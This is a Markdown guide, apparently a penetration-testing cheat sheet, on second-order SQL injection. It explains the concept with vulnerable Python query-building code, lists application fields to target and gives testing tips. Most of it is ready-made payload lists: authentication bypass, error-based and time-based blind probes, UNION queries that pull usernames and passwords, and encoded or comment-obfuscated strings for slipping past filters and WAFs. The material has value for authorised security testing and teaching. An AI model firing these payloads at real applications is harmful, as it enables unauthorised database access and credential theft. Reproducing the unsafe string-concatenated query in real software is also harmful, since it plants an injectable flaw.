

# 🧨 Second Order SQL Injection (SO-SQLi) Guide

## 💡 What is Second Order SQL Injection?

**Second Order SQL Injection (SO-SQLi)** occurs when a malicious SQL payload is submitted and stored (e.g., in a database), and is **executed later** when the application reuses that data in an unsafe SQL query.

Unlike first-order SQLi, the injection doesn’t happen right away — it’s **triggered in a separate step**, often in a different part of the application.

---

## ⚙️ How It Works

1. User submits input that is stored (e.g., during registration or profile update).
2. That input is saved **without validation**.
3. Later, the application retrieves and uses the stored data in a SQL query.
4. If this query is built unsafely, the injection is triggered.

---

## 🧪 Example Scenario

### Step 1: Malicious User Registers

```text
Username: attacker' --
Email: attacker@example.com
```

Stored in DB as:

```sql
INSERT INTO users (username, email) VALUES ('attacker\' --', 'attacker@example.com');
```

✅ No error yet — payload is saved.

---

### Step 2: Admin Dashboard Later Uses Username

```python
# Backend code
query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
```

If `user_from_db = attacker' --`, this becomes:

```sql
SELECT * FROM logs WHERE username = 'attacker' --'
```

🔥 Query is broken → Injection succeeds.

---

## 📊 Where and How to Test Payloads 

| 🔍 Application Area     | 🧪 Field to Inject       | 💣 Why It's Vulnerable                                    | ⏱️ When Injection Triggers                |
|------------------------|--------------------------|-----------------------------------------------------------|-------------------------------------------|
| User Registration      | `username`, `email`      | Values stored, reused in logs or admin views              | When admin views logs or user profile     |
| Profile Update         | `display name`, `bio`    | Reused in dashboards or internal reporting tools          | When data is retrieved by another user    |
| Feedback/Contact Forms | `subject`, `message`     | Stored in DB, emailed or inserted into analytics queries  | When viewed or processed by admin         |
| Support Ticket System  | `ticket title`, `details`| May be reused in SQL joins, search features               | When admin searches or filters tickets    |
| Comment Systems        | `username`, `comment`    | Appears in other queries like moderation tools            | When moderator queries by username        |

---

## 🎯 Tips for Testing SO-SQLi

- Inject payloads like `' OR 1=1 --` into fields that are **stored**, not just reflected.
- Track where that input **reappears later** in the app (logs, admin panel, reports).
- Test different **delays** between storing and triggering (could be minutes or days).
- Use tools like **Burp Suite** to capture and replay original injection attempts.
- Always check **query construction** when reviewing source code (if available).

---


#### 🔹 Classic Authentication Bypass

```sql
' OR '1'='1
' OR 1=1 --
'-- 
'#
admin'-- 
' OR 1=1 LIMIT 1 --
```

---

#### 🔹 Error-Based Payloads (to detect execution)

```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58),@@version,CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

---

#### 🔹 Time-Based Blind SQLi (for delayed triggers)

```sql
' OR SLEEP(5) --
' AND SLEEP(5) --
' WAITFOR DELAY '00:00:05' --
```

---

#### 🔹 Union-Based (if data is displayed somewhere)

```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username, password FROM users --
```

---

#### 🔹 Obfuscated & Bypassing Filters

```sql
%27%20OR%201%3D1--
%27%20UNION%20SELECT%20NULL,NULL--
admin%27%23
admin')-- 
```

---

#### 🔹 Null Byte & Comment Tricks

```sql
admin%00
admin'/**/OR/**/'1'='1
admin'/**/-- 
```

---

### 📌 Bonus: Tamper-Friendly SO-SQLi Payloads

If the app uses WAFs or input filters:

```sql
'/*!12345UNION*/ SELECT NULL,NULL --
'/**/OR/**/1=1/**/--
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 80 --
```

---

### ✅ Where to Try These Payloads

| Input Type            | Good For Testing SO-SQLi? | Example Use Case                      |
|-----------------------|----------------------------|----------------------------------------|
| `Username`            | ✅ Yes                     | Reused in admin or logging queries     |
| `Email`               | ✅ Yes                     | Used in backend reports or exports     |
| `Bio/Profile Info`    | ✅ Yes                     | Shown in user listings or analytics    |
| `Ticket Subject`      | ✅ Yes                     | Often filtered, searched, and joined   |
| `Comments/Posts`      | ✅ Yes                     | Parsed in dashboards or moderation     |

---


## 📚 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

